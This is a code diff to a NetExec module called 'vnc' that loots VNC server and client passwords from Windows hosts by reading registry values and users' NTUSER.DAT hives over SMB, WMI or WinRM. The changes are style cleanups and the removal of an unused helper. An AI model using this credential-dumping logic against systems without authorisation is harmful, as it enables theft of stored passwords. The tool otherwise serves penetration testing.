@@ -1,10 +1,7 @@
 import ntpath
 import tempfile
 
-from impacket.dcerpc.v5 import rrp
 from impacket import winregistry
-from impacket.examples.secretsdump import RemoteOperations
-from impacket.system_errors import ERROR_NO_MORE_ITEMS
 
 from Cryptodome.Cipher import DES
 from binascii import unhexlify
@@ -21,7 +18,7 @@ class NXCModule:
 
     name = "vnc"
     description = "Loot Passwords from VNC server and client configurations"
-    supported_protocols = ["smb","wmi","winrm"]
+    supported_protocols = ["smb", "wmi", "winrm"]
     category = CATEGORY.CREDENTIAL_DUMPING
 
     def __init__(self, context=None, module_options=None):
@@ -47,7 +44,7 @@ class NXCModule:
     def on_admin_login(self, context, connection):
         self.context = context
         self.connection = connection
-        self.share = self.connection.args.share if hasattr(self.connection.args,"share") else "C$"
+        self.share = self.connection.args.share if hasattr(self.connection.args, "share") else "C$"
 
         dploot_conn = connection.dpapi_triage.conn
 
@@ -56,35 +53,13 @@ class NXCModule:
             self.vnc_client_proxyconf_extract(dploot_conn)
         self.vnc_from_filesystem(dploot_conn)
 
-    def reg_query_value(self, dploot_conn, path, key, hku=False):
-        dploot_conn.reg_get_key_value()
-        if remote_ops._RemoteOperations__rrp:
-            ans = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp) if hku else rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
-            reg_handle = ans["phKey"]
-            ans = rrp.hBaseRegOpenKey(
-                remote_ops._RemoteOperations__rrp,
-                reg_handle,
-                path,
-            )
-            key_handle = ans["phkResult"]
-            data = None
-            try:
-                _, data = rrp.hBaseRegQueryValue(
-                    remote_ops._RemoteOperations__rrp,
-                    key_handle,
-                    key,
-                )
-                return data
-            except rrp.DCERPCSessionError as e:
-                self.context.log.debug(f"Error while querying registry value for {path} {key}: {e}")
-
     def vnc_client_proxyconf_extract(self, dploot_conn):
         vnc_client_softwares = [
             ("RealVNC Viewer 7.x Proxy Conf", "Software\\RealVNC\\vncviewer", ["ProxyUserName", "ProxyPassword", "ProxyServer"]),
         ]
         users = self.get_users(dploot_conn)
         if dploot_conn.target.protocol != "smb":
-            self.context.log.warn(f"Downloading NTUSER.DAT for offline users, will be slow")
+            self.context.log.warn("Downloading NTUSER.DAT for offline users, will be slow")
         for user, sid in users.items():
             ntuser_dat_path = ntpath.join(f"Users\\{user}\\NTUSER.DAT")
             try:
@@ -147,7 +122,7 @@ class NXCModule:
         for vnc_name, path, user, password, server in vnc_users:
             cred = {}
             try:
-                value = dpapi_conn.reg_get_key_value("HKLM",path, password)
+                value = dpapi_conn.reg_get_key_value("HKLM", path, password)
                 if value is None:
                     continue
                 value = value.encode().rstrip(b"\x00").decode()
@@ -224,8 +199,8 @@ class NXCModule:
         users = {}
         userlist_key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"
 
-        for sid in conn.reg_enum_key("HKLM",userlist_key):
-            profile_path = conn.reg_get_key_value("HKLM",f"{userlist_key}\\{sid}","ProfileImagePath")
+        for sid in conn.reg_enum_key("HKLM", userlist_key):
+            profile_path = conn.reg_get_key_value("HKLM", f"{userlist_key}\\{sid}", "ProfileImagePath")
             if "C:\\Users" not in profile_path:
                 continue
             users[ntpath.basename(profile_path).rstrip("\0")] = sid.rstrip("\0")
